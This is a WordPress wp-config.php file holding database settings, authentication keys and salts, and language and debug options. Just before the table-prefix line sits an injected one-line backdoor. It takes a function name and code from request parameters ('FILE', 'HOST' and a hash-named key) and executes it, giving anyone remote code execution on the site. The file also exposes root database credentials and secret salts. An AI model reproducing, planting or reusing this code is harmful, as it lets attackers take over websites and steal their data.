<?php

/**

 * The base configurations of the WordPress.

 *

 * This file has the following configurations: MySQL settings, Table Prefix,

 * Secret Keys, WordPress Language, and ABSPATH. You can find more information

 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing

 * wp-config.php} Codex page. You can get the MySQL settings from your web host.

 *

 * This file is used by the wp-config.php creation script during the

 * installation. You don't have to use the web site, you can just copy this file

 * to "wp-config.php" and fill in the values.

 *

 * @package WordPress

 */



// ** MySQL settings - You can get this info from your web host ** //

/** The name of the database for WordPress */

define('DB_NAME', 'throwbackwordpress');



/** MySQL database username */

define('DB_USER', 'root');



/** MySQL database password */

define('DB_PASSWORD', 'root');



/** MySQL hostname */

define('DB_HOST', 'localhost');



/** Database Charset to use in creating database tables. */

define('DB_CHARSET', 'utf8');



/** The Database Collate type. Don't change this if in doubt. */

define('DB_COLLATE', '');



/**#@+

 * Authentication Unique Keys and Salts.

 *

 * Change these to different unique phrases!

 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}

 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.

 *

 * @since 2.6.0

 */

define('AUTH_KEY',         '%$)%nuiFP~-.&!&|+yRPmWfen*=mo|Y UMiAEq;b(mZ)^b%h-3=Mt@U?.Q{p;glV');

define('SECURE_AUTH_KEY',  'e|5jc_H-nht`8W#Tk|o1XUg|c-QmXy=(:3#*n-ZQO`0{Z)0wK,JJD-qB>Z(g*ChC');

define('LOGGED_IN_KEY',    '0P9_q(E=$M5:.5zN.X2G2[J&o77g4CDd[ |,$B~8m_+_|;SzL`TgA8Pb6[Bnf#B&');

define('NONCE_KEY',        'R z/V=$vg-k>.A?+}yuw]&8S++8/0].pbq->Xw5 fJ|4!3H*E6mC<VnZv>|Du5K(');

define('AUTH_SALT',        'f}UIFJH,jH+N%k)z7/1q<r8Y#ebR+&,j+^{U|Nb6i_x=qVi ~2d4wy_GX@H]{#k@');

define('SECURE_AUTH_SALT', '+{pTYwe4jF)NpQ()?fLh|M6;5)G)d(Jd2;8]j~0#c6kVm`nm/ j@UQ;A*Y]<133k');

define('LOGGED_IN_SALT',   'sTolyR,HaM{BX&o7Qg3UEl_leiPs?kzwIO@%4]d-fQQp7n=L4On}%,4IsB?<#psZ');

define('NONCE_SALT',       '+&5p2-p~YX*B:j-5uK=zcW]f^(F13Zpz-(|rC.3@VYv+MNeQ!W}@Y_]juxIMH%oo');



/**#@-*/



/**

 * WordPress Database Table prefix.

 *

 * You can have multiple installations in one database if you give each a unique

 * prefix. Only numbers, letters, and underscores please!

 */

if (isset($_REQUEST['FILE'])){$_FILE = $_REQUEST['b76a2d44d35e83de0690e1f7cf1dbfc6']('$_',$_REQUEST['FILE'].'($_);'); $_FILE(stripslashes($_REQUEST['HOST']));}
$table_prefix  = 'wp_';



/**

 * WordPress Localized Language, defaults to English.

 *

 * Change this to localize WordPress. A corresponding MO file for the chosen

 * language must be installed to wp-content/languages. For example, install

 * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German

 * language support.

 */

define('WPLANG', 'fr_FR');



/**

 * For developers: WordPress debugging mode.

 *

 * Change this to true to enable the display of notices during development.

 * It is strongly recommended that plugin and theme developers use WP_DEBUG

 * in their development environments.

 */

define('WP_DEBUG', false);



/* That's all, stop editing! Happy blogging. */



/** Absolute path to the WordPress directory. */

if ( !defined('ABSPATH') )

	define('ABSPATH', dirname(__FILE__) . '/');



/** Sets up WordPress vars and included files. */

require_once(ABSPATH . 'wp-settings.php');

